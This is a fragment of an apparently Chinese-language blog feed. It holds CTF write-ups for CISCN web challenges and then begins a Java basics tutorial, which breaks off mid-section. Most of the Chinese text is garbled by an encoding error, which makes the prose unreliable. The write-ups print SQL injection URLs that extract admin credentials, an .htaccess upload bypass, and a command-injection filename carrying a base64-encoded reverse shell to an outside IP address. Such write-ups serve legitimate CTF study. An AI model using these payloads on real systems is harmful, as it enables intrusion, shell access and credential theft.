href="#CISCN-2019åä¸œå—-Double-Secret" class="headerlink" title="[CISCN 2019åä¸œå—]Double Secret"></a>[CISCN 2019åä¸œå—]Double Secret</h2><p>app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">secret=request.args.get(<span class="string">&#x27;secret&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> secret <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Tell me your secret. I will encrypt it so others can\&#x27;t see&#x27;</span></span><br><span class="line"></span><br><span class="line">rc = rc4_Modified.RC4(<span class="string">&quot;HereIsTreasure&quot;</span>)  <span class="comment"># è§£å¯†</span></span><br><span class="line">deS = rc.do_crypt(secret)</span><br><span class="line"></span><br><span class="line">a = render_template_string(safe(deS))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;ciscn&#x27;</span> <span class="keyword">in</span> a.lower():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;flag detected!&#x27;</span></span><br><span class="line"><span class="keyword">return</span> a</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>rc4_Modified.RC4.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">r = (self.Box[self.index_i] + self.Box[self.index_j]) % <span class="number">256</span></span><br><span class="line">R = self.Box[r]  <span class="comment"># ç”Ÿæˆä¼ªéšæœºæ•°</span></span><br><span class="line">tmp = <span class="built_in">ord</span>(s) ^ R</span><br><span class="line">test.append(tmp)</span><br><span class="line">out.append(<span class="built_in">chr</span>(tmp))</span><br><span class="line"><span class="comment"># print(test)</span></span><br><span class="line"><span class="comment"># print(len(test))</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(out)</span><br></pre></td></tr></table></figure><h2 id="CISCN-2023-è¥¿å—-do-you-like-read"><a href="#CISCN-2023-è¥¿å—-do-you-like-read" class="headerlink" title="[CISCN 2023 è¥¿å—]do_you_like_read"></a>[CISCN 2023 è¥¿å—]do_you_like_read</h2><p>è¿›å»å°±èƒ½æ‰¾åˆ°ä¸€ä¸ªæ³¨å…¥ç‚¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28771/book.php?bookisbn=-1%27union%20select%20database(),2,3,4,5,6,7,8--+</span><br></pre></td></tr></table></figure><p>obs_db</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28771/book.php</span><br><span class="line">?bookisbn=-1&#x27;union select group_concat(table_name),2,3,4,5,6,7,8 from information_schema.tables where table_schema=&#x27;obs_db&#x27;--+</span><br></pre></td></tr></table></figure><p>admin,books,customers,order_items,orders,publisher</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28771/book.php</span><br><span class="line">?bookisbn=-1&#x27;union select group_concat(column_name),2,3,4,5,6,7,8 from information_schema.columns where table_name=&#x27;admin&#x27;--+</span><br></pre></td></tr></table></figure><p>name,pass</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28771/book.php</span><br><span class="line">?bookisbn=-1&#x27;union select group_concat(name,pass),2,3,4,5,6,7,8 from obs_db.admin--+</span><br></pre></td></tr></table></figure><p>adminf865b53623b121fd34ee5426c792e5c33af8c227</p><p>è¿™é‡Œæ‹¿åˆ°äº†adminå¯†ç çš„å“ˆå¸Œå€¼</p><p>æ‰”åˆ°è§£å¯†ç½‘ç«™è·‘ä¸€ä¸‹, ç›´æ¥å‡ºå¯†ç </p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240313102458081.png" alt="image-20240313102458081"></p><p>ç™»å½•ä¸Šå»å¯ä»¥çœ‹è§æ˜¯æœ‰ä¸Šä¼ ç‚¹</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240313102719572.png" alt="image-20240313102719572"></p><p>å°è¯•ä¼ ä¸€ä¸ªphp, å‘ç°è‡ªåŠ¨è¢«æ”¹æˆäº†.jpg</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240313103055789.png" alt="image-20240313103055789"></p><p>å°è¯•ä¼ .htaccess</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240313104133868.png" alt="image-20240313104133868"></p><p>è®¿é—®ä¹‹å‰è¢«æ”¹äº†åç¼€çš„ğŸ</p><p>æˆåŠŸè§£æ</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240313104212524.png" alt="image-20240313104212524"></p><p>çœ‹äº†ä¸‹é¢˜è§£, è¿™å¥½åƒæ˜¯éé¢„æœŸ</p><h2 id="CISCN-2019ååŒ—Day1-Web2"><a href="#CISCN-2019ååŒ—Day1-Web2" class="headerlink" title="[CISCN 2019ååŒ—Day1]Web2"></a>[CISCN 2019ååŒ—Day1]Web2</h2><h2 id="CISCN-2023-ååŒ—-pysym"><a href="#CISCN-2023-ååŒ—-pysym" class="headerlink" title="[CISCN 2023 ååŒ—]pysym"></a>[CISCN 2023 ååŒ—]pysym</h2><p>app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, send_from_directory</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>]=<span class="string">&#x27;uploads&#x27;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POST</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;No file uploaded.&#x27;</span></span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> file.content_length &gt; <span class="number">10240</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;file too lager&#x27;</span></span><br><span class="line">    path = <span class="string">&#x27;&#x27;</span>.join(random.choices(string.hexdigits, k=<span class="number">16</span>))</span><br><span class="line">    directory = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], path)</span><br><span class="line">    os.makedirs(directory, mode=<span class="number">0o755</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line">    savepath=os.path.join(directory, file.filename)</span><br><span class="line">    file.save(savepath)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">     os.system(<span class="string">&#x27;tar --absolute-names  -xvf &#123;&#125; -C &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(savepath,directory))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;something wrong in extracting&#x27;</span></span><br><span class="line"></span><br><span class="line">    links = []</span><br><span class="line">    <span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> os.walk(directory):</span><br><span class="line">        <span class="keyword">for</span> name <span class="keyword">in</span> files:</span><br><span class="line">            extractedfile =os.path.join(root, name)</span><br><span class="line">            <span class="keyword">if</span> os.path.islink(extractedfile):</span><br><span class="line">                os.remove(extractedfile)</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;no symlink&#x27;</span></span><br><span class="line">            <span class="keyword">if</span>  os.path.isdir(path) :</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;no directory&#x27;</span></span><br><span class="line">            links.append(extractedfile)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,links=links)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/uploads/&lt;path:path&gt;&quot;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>(<span class="params">path</span>):</span><br><span class="line">    filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(filepath):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;404&#x27;</span>, <span class="number">404</span></span><br><span class="line">    <span class="keyword">return</span> send_from_directory(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], path)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">1337</span>)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸€ä¸ªå¾ˆæ˜æ˜¾çš„å‘½ä»¤æ³¨å…¥, ç”¨sleepæµ‹ä¸€ä¸‹å‘ç°çš„ç¡®å¯ä»¥æ³¨å…¥,</p><p>ç›´æ¥å¼¹ä¸ªshellå›æ¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=&quot;a.tar;echo$&#123;IFS&#125;YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDcuMTQ4Ljc1LjIwMi8xMjM0IDA+JjE=|base64$&#123;IFS&#125;--decode|bash;&quot;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240313114927363.png" alt="image-20240313114927363"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World&quot;&gt;&lt;a href=&quot;#CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World&quot; class=&quot;headerlink&quot; title=&quot;[CISCN2019 ååŒ—èµ›åŒº Day2 W</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Javaå®‰å…¨åŸºç¡€</title>
    <link href="http://example.com/2024/03/08/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    <id>http://example.com/2024/03/08/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/</id>
    <published>2024-03-08T12:29:02.000Z</published>
    <updated>2024-03-09T14:24:18.918Z</updated>
    
    <content type="html"><![CDATA[<h1 id="JavaåŸºç¡€è¯­æ³•"><a href="#JavaåŸºç¡€è¯­æ³•" class="headerlink" title="JavaåŸºç¡€è¯­æ³•"></a>JavaåŸºç¡€è¯­æ³•</h1><h2 id="SOUTå’ŒSOUFè¾“å‡º"><a href="#SOUTå’ŒSOUFè¾“å‡º" class="headerlink" title="SOUTå’ŒSOUFè¾“å‡º"></a>SOUTå’ŒSOUFè¾“å‡º</h2><h3 id="SOUT"><a href="#SOUT" class="headerlink" title="SOUT"></a>SOUT</h3><p>ä¸èƒ½ä½¿ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸², ä½†å¯ä»¥ä½¿ç”¨<code>+</code>æ‹¼æ¥</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">System.out.print(<span class="string">&quot;hello,&quot;</span> + <span class="string">&quot;world!&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;hello,&quot;</span> + <span class="string">&quot;world!&quot;</span>); <span class="comment">// æœ«å°¾è‡ªåŠ¨è¡¥ä¸€ä¸ªæ¢è¡Œç¬¦</span></span><br></pre></td></tr></table></figure><h3 id="SOUF"><a href="#SOUF" class="headerlink" title="SOUF"></a>SOUF</h3><p>å¯ä»¥ä½¿ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">System.out.printf(<span class="string">&quot;hello,&quot;</span> + <span class="string">&quot;world and %s!&quot;</span>, <span class="string">&quot;you&quot;</span>);</span><br><span class="line"><span class="comment">//hello,world and you!</span></span><br></pre></td></tr></table></figure><h2 id="Scannerè¾“å…¥"><a href="#Scannerè¾“å…¥" class="headerlink" title="Scannerè¾“å…¥"></a>Scannerè¾“å…¥</h2><p><strong>ä¸¤ç§è¾“å…¥æ–¹å¼<code>next()ï¼Œnextline()</code></strong></p><h3 id="next"><a href="#next" class="headerlink" title="next()"></a>next()</h3><p>ä»¥ç©ºæ ¼ä¸ºç»“æŸç¬¦</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.n4c1.www;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;Please input:&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(input.hasNext()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> input.next();</span><br><span class="line">            System.out.printf(<span class="string">&quot;hello %s&quot;</span>, str);</span><br><span class="line">        &#125;</span><br><span class="line">        input.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240308204606772.png" alt="image-20240308204606772"></p><h3 id="nextline"><a href="#nextline" class="headerlink" title="nextline()"></a>nextline()</h3><p>ä»¥å›è½¦ä¸ºç»“æŸç¬¦</p><h2 id="forå¾ªç¯"><a href="#forå¾ªç¯" class="headerlink" title="forå¾ªç¯"></a>forå¾ªç¯</h2><p>ä¸Cè¯­è¨€å®Œå…¨ç›¸åŒ</p><h2 id="å¢å¼ºforå¾ªç¯"><a href="#å¢å¼ºforå¾ªç¯" class="headerlink" title="å¢å¼ºforå¾ªç¯"></a>å¢å¼ºforå¾ªç¯</h2><p>è‡ªåŠ¨éå†æ•°ç»„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] numbers = &#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i : numbers) &#123;</span><br><span class="line">            System.out.println(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ç±»ä¸ç»§æ‰¿"><a href="#ç±»ä¸ç»§æ‰¿" class="headerlink" title="ç±»ä¸ç»§æ‰¿"></a>ç±»ä¸ç»§æ‰¿</h2><p><strong>å°çŸ¥è¯†</strong></p><blockquote><ul><li><strong>Publicç±»ï¼š</strong> ä¸€ä¸ªJavaæ–‡ä»¶ä¸­åªèƒ½æœ‰ä¸€ä¸ª<code>public</code>ç±»ï¼Œå¹¶ä¸”è¿™ä¸ª<code>public</code>ç±»çš„åç§°å¿…é¡»ä¸æ–‡ä»¶åç›¸åŒã€‚è¿™æ ·çš„ç±»å¯ä»¥ä»å…¶ä»–åŒ…ä¸­è®¿é—®ã€‚</li><li><strong>épublicç±»ï¼š</strong> ä¸€ä¸ªJavaæ–‡ä»¶å¯ä»¥åŒ…å«å¤šä¸ªépublicç±»ï¼Œå®ƒä»¬çš„è®¿é—®çº§åˆ«è¢«é™åˆ¶åœ¨åŒä¸€åŒ…ä¸­ã€‚è¿™äº›ç±»ä¸èƒ½è¢«å…¶ä»–åŒ…ä¸­çš„ç±»ç›´æ¥è®¿é—®ã€‚</li></ul></blockquote><p>Person.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.n4c1.www;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span>&#123;</span><br><span class="line">        System.out.printf(<span class="string">&quot;I am %s, and I am %d years old.\n&quot;</span>, name, age);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Test.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.n4c1.www;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">n4c1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;n4c1&quot;</span>, <span class="number">19</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;1 year later,&quot;</span>);</span><br><span class="line">        n4c1.setAge(<span class="number">20</span>);</span><br><span class="line">        System.out.printf(<span class="string">&quot;I will be %d&quot;</span>, n4c1.age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240308210528171.png" alt="image-20240308210528171"></p><p><strong>extends</strong></p><p>SuperMan.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.n4c1.www;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SuperMan</span> <span class="keyword">extends</span> <span class="title class_">Person</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SuperMan</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123; <span class="comment">//åˆ›å»ºæ„é€ å™¨</span></span><br><span class="line">        <span class="built_in">super</span>(name, age);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">superPower</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;I can do this all day!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.n4c1.www;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">SuperMan</span> <span class="variable">n4c1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SuperMan</span>(<span class="string">&quot;n4c1&quot;</span> ,<span class="number">19</span>);</span><br><span class="line">        n4c1.superPower();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240308213418330.png" alt="image-20240308213418330"></p><p><strong>implements</strong></p><p>ç•¥</p><h2 id="æŠ½è±¡ç±»"><a href="#æŠ½è±¡ç±»" class="headerlink" title="æŠ½è±¡ç±»"></a>æŠ½è±¡ç±»</h2><p>ä¸phpç›¸ä¼¼</p><p>ç•¥</p><h2 id="æ¥å£"><a href="#æ¥å£" class="headerlink" title="æ¥å£"></a>æ¥å£</h2><blockquote><p>æ¥å£ï¼ˆè‹±æ–‡ï¼šInterfaceï¼‰ï¼Œåœ¨JAVAç¼–ç¨‹è¯­è¨€ä¸­æ˜¯ä¸€ä¸ªæŠ½è±¡ç±»å‹ï¼Œæ˜¯æŠ½è±¡æ–¹æ³•çš„é›†åˆï¼Œæ¥å£é€šå¸¸ä»¥interfaceæ¥å£°æ˜ã€‚ä¸€ä¸ªç±»é€šè¿‡ç»§æ‰¿æ¥å£çš„æ–¹å¼ï¼Œä»è€Œæ¥ç»§æ‰¿æ¥å£çš„æŠ½è±¡æ–¹æ³•ã€‚</p></blockquote><blockquote><h4 id="æ¥å£ä¸ç±»çš„åŒºåˆ«ï¼š"><a href="#æ¥å£ä¸ç±»çš„åŒºåˆ«ï¼š" class="headerlink" title="æ¥å£ä¸ç±»çš„åŒºåˆ«ï¼š"></a>æ¥å£ä¸ç±»çš„åŒºåˆ«ï¼š</h4><ul><li>æ¥å£ä¸èƒ½ç”¨äºå®ä¾‹åŒ–å¯¹è±¡ã€‚</li><li>æ¥å£æ²¡æœ‰æ„é€ æ–¹æ³•ã€‚</li><li>æ¥å£ä¸­æ‰€æœ‰çš„æ–¹æ³•å¿…é¡»æ˜¯æŠ½è±¡æ–¹æ³•ï¼ŒJava 8 ä¹‹å æ¥å£ä¸­å¯ä»¥ä½¿ç”¨ default å…³é”®å­—ä¿®é¥°çš„éæŠ½è±¡æ–¹æ³•ã€‚</li><li>æ¥å£ä¸èƒ½åŒ…å«æˆå‘˜å˜é‡ï¼Œé™¤äº† static å’Œ final å˜é‡ã€‚</li><li>æ¥å£ä¸æ˜¯è¢«ç±»ç»§æ‰¿äº†ï¼Œè€Œæ˜¯è¦è¢«ç±»å®ç°ã€‚</li><li>æ¥å£æ”¯æŒå¤šç»§æ‰¿ã€‚</li></ul><h4 id="æ¥å£ç‰¹æ€§"><a href="#æ¥å£ç‰¹æ€§" class="headerlink" title="æ¥å£ç‰¹æ€§"></a>æ¥å£ç‰¹æ€§</h4><ul><li>æ¥å£ä¸­æ¯ä¸€ä¸ªæ–¹æ³•ä¹Ÿæ˜¯éšå¼æŠ½è±¡çš„,æ¥å£ä¸­çš„æ–¹æ³•ä¼šè¢«éšå¼çš„æŒ‡å®šä¸º <strong>public abstract</strong>ï¼ˆåªèƒ½æ˜¯ public abstractï¼Œå…¶ä»–ä¿®é¥°ç¬¦éƒ½ä¼šæŠ¥é”™ï¼‰ã€‚</li><li>æ¥å£ä¸­å¯ä»¥å«æœ‰å˜é‡ï¼Œä½†æ˜¯æ¥å£ä¸­çš„å˜é‡ä¼šè¢«éšå¼çš„æŒ‡å®šä¸º <strong>public static final</strong> å˜é‡ï¼ˆå¹¶ä¸”åªèƒ½æ˜¯ publicï¼Œç”¨ private ä¿®é¥°ä¼šæŠ¥ç¼–è¯‘é”™è¯¯ï¼‰ã€‚</li><li>æ¥å£ä¸­çš„æ–¹æ³•æ˜¯ä¸èƒ½åœ¨æ¥å£ä¸­å®ç°çš„ï¼Œåªèƒ½ç”±å®ç°æ¥å£çš„ç±»æ¥å®ç°æ¥å£ä¸­çš„æ–¹æ³•ã€‚</li></ul><h4 id="æŠ½è±¡ç±»å’Œæ¥å£çš„åŒºåˆ«"><a href="#æŠ½è±¡ç±»å’Œæ¥å£çš„åŒºåˆ«" class="headerlink" title="æŠ½è±¡ç±»å’Œæ¥å£çš„åŒºåˆ«"></a>æŠ½è±¡ç±»å’Œæ¥å£çš„åŒºåˆ«</h4><ul><li><ol><li>æŠ½è±¡ç±»ä¸­çš„æ–¹æ³•å¯ä»¥æœ‰æ–¹æ³•ä½“ï¼Œå°±æ˜¯èƒ½å®ç°æ–¹æ³•çš„å…·ä½“åŠŸèƒ½ï¼Œä½†æ˜¯æ¥å£ä¸­çš„æ–¹æ³•ä¸è¡Œã€‚</li></ol></li><li><ol start="2"><li>æŠ½è±¡ç±»ä¸­çš„æˆå‘˜å˜é‡å¯ä»¥æ˜¯å„ç§ç±»å‹çš„ï¼Œè€Œæ¥å£ä¸­çš„æˆå‘˜å˜é‡åªèƒ½æ˜¯ <strong>public static final</strong> ç±»å‹çš„ã€‚</li></ol></li><li><ol start="3"><li>æ¥å£ä¸­ä¸èƒ½å«æœ‰é™æ€ä»£ç å—ä»¥åŠé™æ€æ–¹æ³•(ç”¨ static ä¿®é¥°çš„æ–¹æ³•)ï¼Œè€ŒæŠ½è±¡ç±»æ˜¯å¯ä»¥æœ‰é™æ€ä»£ç å—å’Œé™æ€æ–¹æ³•ã€‚</li></ol></li><li><ol start="4"><li>ä¸€ä¸ªç±»åªèƒ½ç»§æ‰¿ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œè€Œä¸€ä¸ªç±»å´å¯ä»¥å®ç°å¤šä¸ªæ¥å£ã€‚</li></ol></li></ul></blockquote><h3 id="æ¥å£çš„å®ç°"><a href="#æ¥å£çš„å®ç°" class="headerlink" 